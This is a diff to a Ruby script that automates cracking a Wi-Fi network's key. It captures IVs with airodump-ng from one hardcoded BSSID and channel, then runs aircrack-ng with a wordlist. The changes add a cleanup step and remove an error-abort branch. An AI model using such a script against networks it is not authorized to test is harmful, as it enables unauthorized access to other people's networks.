@@ -17,6 +17,8 @@ again = true
 while again do
 	
 	again = false	
+	cleaner()
+	# Deletes all iv-s and txt-s
 	
 	p = IO.popen("sudo airodump-ng mon0 --bssid 00:1D:7E:FB:38:80 -c 11 -w replay --ivs")
 
@@ -41,11 +43,7 @@ while again do
 
 	a = `sudo aircrack-ng -w pass.lst replay-01.ivs`
 
-	if !system("sudo aircrack-ng -w pass.lst replay-01.ivs")
-		monitoring_stopper()
-		cleaner()
-		abort("\nCracker fail!")
-	elsif a =~ /no data packets/
+	if a =~ /no data packets/
 		again = true
 	end
 
@@ -56,5 +54,4 @@ monitoring_stopper(airmon_parser)
 
 cleaner()
 # Deletes all iv-s and txt-s
-
 
